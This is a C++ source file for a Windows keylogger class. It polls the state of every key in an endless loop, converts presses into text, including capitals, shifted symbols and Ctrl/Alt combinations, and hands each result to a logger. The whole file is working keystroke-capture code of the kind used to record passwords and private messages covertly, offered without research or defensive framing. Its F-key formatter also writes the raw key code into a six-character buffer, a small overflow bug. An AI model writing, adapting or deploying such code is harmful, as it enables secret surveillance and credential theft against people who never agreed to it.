#include "KeyLogger.h"
#include <iostream>
#include <fstream>
#include <Windows.h>
#include <vector>


# define KEY_DOWN_MASK 0x8000
# define TOGGLED_KEY_MASK 1
# define PRESSED_SINCE_LAST_CALL_MASK 1

using namespace std;


KeyLogger::KeyLogger(Logger* logger) {
	this->logger = logger;
}

map<int, wstring> KeyLogger::SymbolsMapping = {
	{'0', L")"},
	{'1', L"!"},
	{'2', L"@"},
	{'3', L"#"},
	{'4', L"$"},
	{'5', L"%"},
	{'6', L"^"},
	{'7', L"&"},
	{'8', L"*"},
	{'9', L"("}
};

map<int, wstring> KeyLogger::WhitespacesMapping = {
	{VK_SPACE, L" "},
	{VK_RETURN, L"\n"},
	{VK_TAB, L"\t"},
};

map<int, wstring> KeyLogger::HotKeysMapping = {
	{VK_CONTROL, L"Ctrl"},
	{VK_SHIFT, L"Shift"},
	{VK_MENU, L"Alt"},
	{VK_TAB, L"Tab"}
};

bool KeyLogger::IsPressed(int keyCode) {
	SHORT keyState = GetAsyncKeyState(keyCode);
	bool keyDown = (keyState & KEY_DOWN_MASK) != 0;
	bool pressedSinceLastCall = (keyState & PRESSED_SINCE_LAST_CALL_MASK) != 0;

	return keyDown && pressedSinceLastCall;
}

bool KeyLogger::IsKeyDown(int keyCode) {
	SHORT keyState = GetAsyncKeyState(keyCode);
	return (keyState & KEY_DOWN_MASK) != 0;
}

bool KeyLogger::IsToggled(int keyCode) {
	return (GetKeyState(keyCode) & TOGGLED_KEY_MASK) != 0;
}

bool KeyLogger::IsCombination(int keyCode) {
	bool isCombinationKey = keyCode == VK_CONTROL || keyCode == VK_MENU;
	bool combinationKeysPressed = this->IsKeyDown(VK_CONTROL) || this->IsKeyDown(VK_MENU);

	return combinationKeysPressed && !isCombinationKey;
}

bool KeyLogger::IsLetter(int keyCode) {
	bool isAtoZ = keyCode >= 'A' && keyCode <= 'Z';

	// These keycodes can be interpeted as letters for some
	// keyboard layouts
	bool canBeCharacter = keyCode >= VK_OEM_1 && keyCode <= VK_OEM_102;
	
	// The keyCode actually matches the ascii values, so simply check
	// if between A-Z
	return isAtoZ || canBeCharacter;
}

bool KeyLogger::IsNumber(int keyCode) {
	return keyCode >= '0' && keyCode <= '9';
}

bool KeyLogger::IsFKey(int keyCode) {
	return keyCode >= VK_F1 && keyCode <= VK_F24;
}

bool KeyLogger::IsWhitespace(int keyCode) {
	return keyCode == VK_TAB || keyCode == VK_SPACE || keyCode == VK_RETURN;
}

bool KeyLogger::IsNumpadNumber(int keyCode) {
	return keyCode >= VK_NUMPAD0 && keyCode <= VK_NUMPAD9;
}

wstring KeyLogger::GetLetterText(int keyCode) {
	bool shiftKeyDown = this->IsKeyDown(VK_SHIFT);
	bool capsToggled = this->IsToggled(VK_CAPITAL);
	bool isUpperCase = (shiftKeyDown && !capsToggled) || (!shiftKeyDown && capsToggled);

	if (isUpperCase) {
		WCHAR letter[2] = { 0 };
		letter[0] = keyCode;
		
		// Key code of letters is the ascii representation of 
		// the capital letters
		return wstring(letter);
	}

	UINT scanCode = MapVirtualKey(keyCode, MAPVK_VK_TO_VSC);

	BYTE keyboardState[256];
	GetKeyboardState(keyboardState);

	const int resultLength = 64;
	WCHAR resultText[resultLength] = { 0 };

	ToUnicode(keyCode, scanCode, keyboardState, resultText, resultLength, NULL);

	return wstring(resultText);
}

wstring KeyLogger::GetNumberText(int keyCode) {
	wstring result;

	if (this->IsKeyDown(VK_SHIFT)) {
		result = SymbolsMapping[keyCode];
	}
	else {
		WCHAR resultWchar[2] = { 0 };
		resultWchar[0] = keyCode;
		result = wstring(resultWchar);
	}

	return result;
}

wstring KeyLogger::GetNumpadNumberText(int keyCode) {
	if (!this->IsToggled(VK_NUMLOCK)) {
		return L"";
	}

	int number = keyCode - VK_NUMPAD0;
	WCHAR result[2];
	wsprintf(result, L"%d", number);

	return result;
}

wstring KeyLogger::GetCombinationText(int keyCode) {
	wstring combinationText;
	vector<wstring> hotKeys = vector<wstring>();
	
	if (this->IsKeyDown(VK_CONTROL)) {
		hotKeys.push_back(HotKeysMapping[VK_CONTROL]);
	}

	if (this->IsKeyDown(VK_MENU)) {
		hotKeys.push_back(HotKeysMapping[VK_MENU]);
	}

	WCHAR keyText[2] = { 0 };
	keyText[0] = keyCode;
	hotKeys.push_back(keyText);

	// Produce the following format: [Ctrl + Alt + A]
	wstring result = L"[";
	for (int i = 0; i < hotKeys.size(); i++) {
		result += hotKeys[i];
		
		if (i < hotKeys.size() - 1) {
			result += L" + ";
		}
	}
	result += L"]";

	return result;
}


wstring KeyLogger::GetFKeyText(int keyCode) {
	int keyNumber = keyCode - VK_F1 + 1;
	
	WCHAR result[6];
	wsprintf(result, L"[f%d]", keyCode);

	return result;
}

wstring KeyLogger::GetWhitespaceText(int keyCode) {
	return WhitespacesMapping[keyCode];
}

wstring KeyLogger::GetKeyText(int keyCode) {
	if (IsCombination(keyCode)) {
		return GetCombinationText(keyCode);
	}
	if (IsWhitespace(keyCode)) {
		return GetWhitespaceText(keyCode);
	}
	if (IsLetter(keyCode)) {
		return GetLetterText(keyCode);
	}
	if (IsNumber(keyCode)) {
		return GetNumberText(keyCode);
	}
	if (IsNumpadNumber(keyCode)) {
		return GetNumpadNumberText(keyCode);
	}
	if (IsFKey(keyCode)) {
		return GetFKeyText(keyCode);
	}
	
	return L"";
}

void KeyLogger::StartLogging() {
	while (true) {
		// Iterate through all virtual key codes 
		for (int keyCode = 0; keyCode < 256; keyCode++) {
			if (this->IsPressed(keyCode)) { 
				wstring keyText = this->GetKeyText(keyCode);
				this->logger->Write(keyText);
			}
		}

		Sleep(10);
	}
}